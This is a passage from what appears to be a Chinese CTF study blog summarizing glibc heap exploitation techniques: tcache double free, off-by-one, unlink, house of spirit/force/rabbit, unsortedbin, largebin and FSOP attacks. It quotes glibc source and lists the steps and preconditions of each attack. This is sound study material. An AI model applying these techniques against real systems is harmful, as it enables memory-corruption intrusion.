<ol><li><em>tcache：</em>对于tcache来说，double_free显然更简单一点，为了追求运行速度，tcache对doublefree并没有过多的检查，我们直接修改next即可 </li><li>对于 <em>A-&gt;A</em> 可以通过一次malloc(A)，获得edit的权利，然后仿造 <em>fastbinAttack</em> 进行攻击， <strong>在2.27下常修改free_hook</strong> 但是由于申请了三次而只释放了两次，会导致 <em>tcache_count</em> 变为0xff(-1)</li></ol></li><li><strong>libc高版本的double_free：</strong><ol><li>首先对于 <em>tcache</em> 来说，tcache在 <strong>libc2.29</strong> 下加入了key值，通过key值来判断是否存在doublefree，但是key值可以用一定方法绕过，常见的有 <strong>通过edit修改key值&#x2F;houseofbotcake</strong></li></ol></li><li>若存在edit，可以直接进行edit(这是最简单的uaf)，个人观点认为uaf和double_free本质是一家的，当无法对free掉的chunk进行edit的时候，double_free更加方便</li></ol><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p><em>off_by_one</em> 也是低版本中比较常见的漏洞，根据个人经验来说 <strong>通常出现出题人自己写的读入函数容易出现该漏洞</strong> 常常修改prev_inuse和修改prev_size一起利用，从而达到 <em>overlapping</em> 的效果</p><p>在libc2.29之后加入如下检测，会导致unlink无法使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* 后两行代码在最新版本中加入*/</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p><em>unlink</em> 属于比较古早的利用方法,源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                         </span></span><br><span class="line">    <span class="comment">//判断chunk p的大小，是否与下一个chunk 的prev_size相等</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); </span><br><span class="line">    <span class="comment">//让FD指向p的下一个chunk，BK指向p的上一个chunk</span></span><br><span class="line">    FD = P-&gt;fd;                                   </span><br><span class="line">    BK = P-&gt;bk;                                   </span><br><span class="line">    <span class="comment">//以上是，chunk的大小在small bin范围内的断链操作</span></span><br><span class="line">    <span class="comment">//以下是，large bin，的断链操作，首先判断FD的bk，与BK的fd是否同时指向p</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);               </span><br><span class="line">    <span class="keyword">else</span> &#123;                                    </span><br><span class="line">        <span class="comment">//首先进行初步断链，使FD的bk指向BK的fd，BK的fd指向FD，只是堆fd,bk的断链操作</span></span><br><span class="line">        FD-&gt;bk = BK;                                  </span><br><span class="line">        BK-&gt;fd = FD;                                  </span><br><span class="line">        <span class="comment">//以下使堆bk_nextsize,fd_nextsize的断链操作（large bin有两个双向链表，fd，bk用来</span></span><br><span class="line">        <span class="comment">//进行FIFO操作，bk_nextsize,fd_nextsize是根据堆块的大小进行排序的链表）</span></span><br><span class="line">        <span class="comment">//以下第一个if判断p的chunk是否在small范围内</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                  </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;             </span><br><span class="line">            <span class="comment">//判断chunk p的下一个chunk的上一个节点，以及上一个chunk的下一个节点是不是p</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)         </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))     </span><br><span class="line">          malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);    </span><br><span class="line">          <span class="comment">//以下是luoarge bin的断链操作，首先判断chunk p的下下一个chunk的fd_nextsize是否为空</span></span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                     </span><br><span class="line">            <span class="comment">//p的下下一个chunk的fd_nextsize为空</span></span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                       </span><br><span class="line">                <span class="comment">//判断是否只有一个chunk p,是则如下</span></span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              </span><br><span class="line">                <span class="keyword">else</span> &#123;                                 </span><br><span class="line">                <span class="comment">//不是以下操作，四个指针，正常的双向链表的断链操作</span></span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  </span><br><span class="line">                  &#125;                                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                 </span><br><span class="line">              <span class="comment">//p的下下一个chunk的fd_nextsize不为空，直接断链</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              </span><br><span class="line">              &#125;                                    </span><br><span class="line">          &#125;                                    </span><br><span class="line">      &#125;                                        </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>具体的操作可以看我的另外一篇博客 glibclearning，总的来说，我认为unlink主要是写入的地址是根据列表去找，这样子就可以实现 *<em>ptr&#x3D;&amp;(ptr-0x18)</em>,从而达到向ptr写入就是向ptr-0x18写入，再通过覆盖修改ptr为某个函数的got表，从而达到函数劫持的效果</p><h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><h4 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore:"></a>house of lore:</h4><p>修改一个small bin的某个freed chunk的bk为fakechunk，并且修改fakechunk的fd为该freed chunk用于绕过glibc的检查，就可以成功的从small bin中申请该chunk</p><p>在高版本的glibc引用tcache之后，该漏洞就更容易利用，因为在从smallbin中返回一个chunk，并且将剩下的chunk放到tcache中，只会对第一个chunk的fd进行检查，后续的fd并不检查，这样子就很容易造成任意的读写，并且已知calloc会越过tcache直接从smallbin中获得chunk。</p><h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><ol><li><p>假设目前<code>tcache bin</code>中已经有五个堆块，并且相应大小的<code>small bin</code>中已经有两个堆块，由<code>bk</code>指针连接为：<code>chunk_A&lt;-chunk_B</code>。</p></li><li><p>利用漏洞修改<code>chunk_A</code>的<code>bk</code>为<code>fake chunk</code>，并且修改<code>fake chunk</code>的<code>bk</code>为<code>target_addr - 0x10</code>。</p></li><li><p>通过<code>calloc()</code>越过<code>tcache bin</code>，直接从<code>small bin</code>中取出<code>chunk_B</code>返回给用户，并且会将<code>chunk_A</code>以及其所指向的<code>fake chunk</code>放入<code>tcache bin</code>（这里只会检测<code>chunk_A</code>的<code>fd</code>指针是否指向了<code>chunk_B</code>）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">    &amp;&amp; (tc_victim = last (bin) ) != bin) <span class="comment">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">if</span> (tc_victim != <span class="number">0</span>) <span class="comment">//成功获取了chunk</span></span><br><span class="line"> &#123;</span><br><span class="line">     bck = tc_victim-&gt;bk; <span class="comment">//在这里bck是fake chunk的bk</span></span><br><span class="line">     <span class="comment">//设置标志位</span></span><br><span class="line">     set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">     <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         set_non_main_arena (tc_victim);</span><br><span class="line"> </span><br><span class="line">     bin-&gt;bk = bck;</span><br><span class="line">     bck-&gt;fd = bin; <span class="comment">//关键处</span></span><br><span class="line"> </span><br><span class="line">     tcache_put (tc_victim, tc_idx); <span class="comment">//将其放入到tcache中</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在<code>fake chunk</code>放入<code>tcache bin</code>之前，执行了<code>bck-&gt;fd = bin;</code>的操作（这里的<code>bck</code>就是<code>fake chunk</code>的<code>bk</code>，也就是<code>target_addr - 0x10</code>），故<code>target_addr - 0x10</code>的<code>fd</code>，也就<code>target_addr</code>地址会被写入一个与<code>libc</code>相关大数值（可利用）。</p></li><li><p>再申请一次，就可以从<code>tcache</code>中获得<code>fake chunk</code>的控制权。</p></li></ol><h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h3><p>通过伪造chunk，来申请这块chunk，从而进行任意地址写</p><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ol><li>fake chunk的size在fastbin的范围中</li><li>fake chunk的size在fastbin的范围中</li><li>fake chunk的next chunk的size大小满足大于2*SIZE_SZ（64位程序中SIZE_SZ为8），小于av-&gt;system_mem（在main_arena中，默认为128kb）</li><li>fake chunk与对应的fastbin链表头chunk不同（会检查是否double free）</li></ol><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>通过修改topchunk的size，使得可以完成任意地址分配chunk，从而达到修改的效果</p><h4 id="利用条件：-1"><a href="#利用条件：-1" class="headerlink" title="利用条件："></a>利用条件：</h4><ol><li><em>libc2.27</em> 之前，之后对topchunk增加的检测</li><li>分配的 <em>size</em> 没有限制</li></ol><h4 id="攻击步骤："><a href="#攻击步骤：" class="headerlink" title="攻击步骤："></a>攻击步骤：</h4><ol><li>利用 <em>top chunk</em> 的 <em>size</em> 的 <em>unsigned int</em> 类型强转，修改 <code>size=-1</code>,即<code>0xffffffffffffffff</code>，这样就可以任意分配</li><li>将 <em>malloc_size</em> 设置为 <em>target_addr-topchunk_ptr-0x10*2</em> ,接着 <em>malloc(malloc_size)</em> 就可以使得 <em>topchunk</em> 转移到对应的地址</li><li>继续malloc，即可实现任意地址分配chunk</li></ol><h3 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h3><p>通过 <em>malloc_consilidate()</em> 造成 <em>heap_overlap</em> 或者引入 <em>fake_chunk</em> 成为合法 <em>chunk</em> </p><h4 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h4><p><em>malloc_consolidate()</em> 函数对于fastbin的size检查缺失，从而可以进行利用</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件:"></a>利用条件:</h4><ol><li><em>fastbin_chunk</em> 的 <em>size</em> 可控。例如：fastbin中存在两个 <code>0x20</code> 大小的chunk，，我们修改其中一个的size为0x40，即可造成 <em>heap_overlap</em> </li><li>修改fastbin的 fd，将其引入fastbin的链表中，可以将其合法化，但是要注意伪造 <em>fake_chunk’s next_chunk</em> 的size和 <em>next_chunk‘s next_chunk</em> 的size(prev_inuse为1)</li></ol><h3 id="Unsortedbin-Attack"><a href="#Unsortedbin-Attack" class="headerlink" title="Unsortedbin Attack"></a>Unsortedbin Attack</h3><p>常用来向一个地址写入一个大数，经常配合 <em>global_max_fast || tcache_struct_prethread</em> 食用，用来利用 <em>fastbin || tcachebin</em> </p><p><a href="https://zhuanlan.zhihu.com/p/142801582">合天网安对于libc2.29下类似于unsortedbinAttack的利用</a></p><h3 id="largebin-Attack"><a href="#largebin-Attack" class="headerlink" title="largebin Attack"></a>largebin Attack</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理:"></a>原理:</h4><p>问题主要出在源码的这个部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//1</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">...</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//3</span></span><br></pre></td></tr></table></figure><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件:"></a>前提条件:</h4><p>已经有一个 <em>chunk_A</em> 在largebin的的链表中，并且又一个略大于 <em>chunk_A’s size</em> 的 <em>chunk_B</em> 加入largebin，这里有 <em>victim&#x3D;chunk_B&amp;&amp;fwd&#x3D;chunk_A</em> 我们知道，在largebin中，<em>fd_nextsize</em> 指向的是前一个比自己小的chunk。倘若我们 <strong>修改victim的bk为addr1-0x10，victim的bk_nextsize为addr-0x20，就可以向addr1&amp;addr2中写入 victim的值(一个很大的数)，这是结合1,2,3推断出来的</strong> </p><h3 id="IO-FILE利用"><a href="#IO-FILE利用" class="headerlink" title="IO_FILE利用"></a>IO_FILE利用</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p><p>FILE结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>事实上，_IO_FILE的外层有一层 <em>_IO_FILE_Plus</em> 结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于 <em>_IO_jump_t</em> 其结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，IO最终调用的都是这些函数，比如puts最终会调用 <em>_IO_xsputn_t</em> </p><h4 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h4><h5 id="适用版本："><a href="#适用版本：" class="headerlink" title="适用版本："></a>适用版本：</h5><p>libc2.23</p><h5 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h5><p>劫持 <em>vtable||_chain</em> 字段，伪造 <em>IO_FILE</em> 。主要是通过调用 <em>IO_flush_all_lockp()</em> 触发，触发条件如下</p><ol><li>libc检测到内存错误，执行abort函数,<strong>要求libc&lt;2.26</strong></li><li>程序执行exit()函数</li><li>程序从main函数返回</li></ol><p><img src="/../images/1693380789313.png" alt="1693380789313"></p><p>我们先看一下 <em>IO_flush_all_lockp()</em> 函数的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">int</span> last_stamp;</span><br><span class="line"> </span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)   <span class="comment">//如果输出缓冲区有数据，刷新输出缓冲区</span></span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">    fp = fp-&gt;_chain; <span class="comment">//遍历链表</span></span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里推荐一篇文章</p><p><a 